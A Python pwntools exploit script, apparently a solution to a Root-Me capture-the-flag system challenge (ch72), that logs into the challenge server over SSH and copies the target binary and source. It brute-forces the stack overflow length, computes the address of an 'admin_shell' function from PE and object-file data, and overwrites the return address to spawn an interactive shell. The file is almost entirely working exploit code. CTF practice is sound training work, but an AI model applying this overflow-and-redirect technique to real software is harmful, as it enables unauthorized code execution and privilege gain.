
#!/usr/bin/env python2.7
#-*- coding: utf-8 -*-
 
from pwn import *
import os
 
HOST = 'challenge05.root-me.org'
USER = 'app-systeme-ch72'
HOME = '/challenge/app-systeme/ch72'
PWD = USER
PORT = 2225
WRAPPER = './wrapper.sh'
CHALL = './ch72.exe'
CHALL_SRC = './ch72.c'
CHALL_OBJ = './ch72.obj'
SHELL_FUNC = 'admin_shell'
 
# SET CONTEXT
context.clear()
 
# CONNECT TO CHALL
s = ssh(host=HOST, user=USER, password=PWD, port=PORT)
 
# DOWNLOAD THE CHALL
# For some reason s.download() fail to validate the fingerprints...
if not os.path.isfile(CHALL):
    os.system("sshpass -p %s scp -P %s %s@%s:%s/%s . 2>/dev/null" % (PWD, PORT, USER, HOST, HOME, CHALL, ))
if not os.path.isfile(CHALL_SRC):
    os.system("sshpass -p %s scp -P %s %s@%s:%s/%s . 2>/dev/null" % (PWD, PORT, USER, HOST, HOME, CHALL_SRC, ))
if not os.path.isfile(CHALL_OBJ):
    os.system("sshpass -p %s scp -P %s %s@%s:%s/%s . 2>/dev/null" % (PWD, PORT, USER, HOST, HOME, CHALL_OBJ, ))
 
# FIND BUFFER INDEX FOR EIP OVERFLOW
PAYLOAD_LENGTH = 16 - 1
 
res = ""
while 'segmentation fault' not in res.lower():
    PAYLOAD_LENGTH += 1
    p = s.process([CHALL + " <<< " + "A" * PAYLOAD_LENGTH], shell=True)
    res = p.readall()
 
# FIND THE ADDRESS FOR admin_shell
base_addr = subprocess.check_output("readpe %s 2>/dev/null |grep 'ImageBase' |awk '{print $2}'" % (CHALL, ), shell=True)
text_offset = subprocess.check_output("readpe %s 2>/dev/null |grep 'Address of .text section' |awk '{print $5}'" % (CHALL, ), shell=True)
func_offset = subprocess.check_output("objdump -t %s 2>/dev/null |grep '%s' |awk '{print $9}'" % (CHALL_OBJ, SHELL_FUNC, ), shell=True)
func_addr = int(base_addr, 16) + int(text_offset, 16) + int(func_offset, 16)
 
# EXPLOIT
p = s.run([WRAPPER])
p.sendline("A" * PAYLOAD_LENGTH + p32(func_addr))
 
# PROFIT
p.interactive()
